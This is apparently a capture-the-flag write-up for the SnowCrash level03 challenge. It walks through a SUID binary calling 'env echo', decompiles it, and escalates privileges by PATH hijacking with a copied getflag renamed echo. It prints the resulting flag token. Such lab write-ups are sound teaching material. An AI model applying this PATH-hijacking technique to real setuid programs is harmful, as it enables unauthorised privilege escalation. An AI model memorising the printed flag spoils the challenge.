# level03 - PATH Way To The Flag

## Home

- Our home contains an executable file named `level03` who belongs to `flag03` user.
- It has the SUID and SGID bits set, meaning that we can execute it with `flag03` rights.

```
level03@SnowCrash:~$ pwd
/home/user/level03
level03@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

## `level03` Executable

### Program Behavior

- If we run the program, it prints the string `Exploit me`.
- Testing different strings as arguments do not change this behavior.

```
level03@SnowCrash:~$ ./level03
Exploit me
```

### String Content

- The executable contains the following string: `/usr/bin/env echo Exploit me`

```
strings -a level03
            ...
/usr/bin/env echo Exploit me
            ...
level03@SnowCrash:~$ objdump -s -j .rodata level03
            ...
level03: file format elf32-i386
            ...
Contents of section .rodata:
            ...
80485d8 03000000 01000200 2f757372 2f62696e ......../usr/bin
80485e8 2f656e76 20656368 6f204578 706c6f69 /env echo Exploi
80485f8 74206d65 00 t me.
            ...
```

### Decompiling

- Using angr decompiler on [dogbolt.org](https://dogbolt.org)

```
int main()
{
unsigned int v0; // [bp-0xc]
unsigned int v1; // [bp-0x8]

    v0 = getegid();
    v1 = geteuid();
    setresgid(v0, v0, v0);
    setresuid(v1, v1, v1);
    return system("/usr/bin/env echo Exploit me");

}
```

- The `level03` executable will run the command line `/usr/bin/env echo Exploit me` with `flag03` rights.
- We notice that the `echo` command has a relative path whereas the `env` command is given with an absolute path. The environement `PATH` variable will be used to find the `echo` command path, not the `env` command one.

## PATH way to the flag

- By changing the `env` `PATH` variable, it should be possible to delude the `level03` program and let it execute the program of our choice (i.e. `getflag`) as `level03`.
- First we need more rights on our home:

```
level03@SnowCrash:~$ chmod 710 .
```

- We then copy `getflag` as `echo` in our home

```
level03@SnowCrash:~$ cp /bin/getflag echo
```

- And finally run `level03`, changing the `PATH` variable

```
level03@SnowCrash:~$ PATH=./ level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

# Flag

- `level04` password (flag): qi0maab88jeaj46qoumi7maus
